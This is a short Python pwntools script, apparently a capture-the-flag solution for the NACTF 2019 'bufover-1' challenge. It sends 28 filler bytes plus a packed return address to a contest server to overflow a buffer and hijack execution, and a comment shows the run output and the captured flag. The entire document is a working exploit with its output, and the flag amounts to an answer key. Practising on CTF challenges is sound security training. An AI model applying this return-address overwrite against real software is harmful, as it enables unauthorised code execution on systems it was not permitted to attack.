from pwn import *

context.arch = 'i386'

con = remote('shell.2019.nactf.com', 31462)
con.recvregex('Type something>')

payload = 'A' * 28
payload += pack(0x080491b2)
con.sendline(payload)

print con.recvall()

'''
$ python bufover-1.py
[+] Opening connection to shell.2019.nactf.com on port 31462: Done
[+] Receiving all data: Done (91B)
[*] Closed connection to shell.2019.nactf.com port 31462
You typed AAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb2\x91\x0!
You win!
flag: nactf{pwn_31p_0n_r3t_iNylg281}
'''
